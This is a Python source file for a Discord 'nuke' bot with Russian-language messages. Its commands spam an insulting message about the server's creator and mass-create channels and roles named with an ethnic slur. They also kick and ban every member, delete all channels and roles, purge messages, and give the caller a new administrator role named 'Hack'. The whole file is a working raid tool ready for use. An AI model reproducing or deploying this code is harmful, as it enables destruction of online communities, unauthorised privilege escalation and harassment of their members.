import discord
from discord.ext import commands
import config as con

client = commands.Bot(command_prefix="*", intents = discord.Intents.all())


@client.event
async def on_ready():
	print(f'[BOT] Бот {client.user.name} запущен')

@client.command(pass_context=True)
async def spam(ctx, m):
    await ctx.message.delete() 
    count = 0
    while count < int(m):
        await ctx.send("Создатель данного сервера тупое мудло\nЗаказчик бота: Мистер_Шотакон \nСоздатель бота: Wahha")
        count += 1

@client.command(pass_context=True)
async def spam_channel(ctx, m):
    await ctx.message.delete()
    count1 = 0
    while count1 < int(m):
        guild = ctx.message.guild
        await guild.create_text_channel('Lolli_Hohol')
        count1 += 1

@client.command(pass_context=True)
async def role(ctx, m):
    await ctx.message.delete()
    count = 0
    while count < int(m):
        await ctx.guild.create_role(name="Lolli_Hohol")
        count += 1

@client.command()
async def allkick(ctx):
    for m in ctx.guild.members: 
        try:
            await m.kick(reason="Lolli_Hohol") 
        except:
            pass

@client.command()
async def allban(ctx):
    for m in ctx.guild.members: 
        try:
            await m.ban(reason="Lolli_Hohol")
        except:
            pass

@client.command()
async def delete(ctx, amount=100):
    await ctx.channel.purge(limit=amount)

@client.command()
async def delchannel(ctx):
    failed = []
    counter = 0
    for channel in ctx.guild.channels: 
        try:
            await channel.delete(reason="По просьбе") 
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    await ctx.author.send(f"Удалено {counter} каналов. {f'Не удалил: {fmt}' if len(failed) > 0 else ''}")

@client.command()
async def delrole(ctx):
    for m in ctx.guild.roles:
        try:
            await m.delete(reason="По просьбе")
        except:
            pass

@client.command(pass_context=True)  
async def admin(ctx):  
    
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) 
    await guild.create_role(name="Hack", permissions=perms)
    
    role = discord.utils.get(ctx.guild.roles, name="Hack") 
    user = ctx.message.author 
    await user.add_roles(role)
    
    await ctx.message.delete()

client.run(con.BOT_TOKEN)
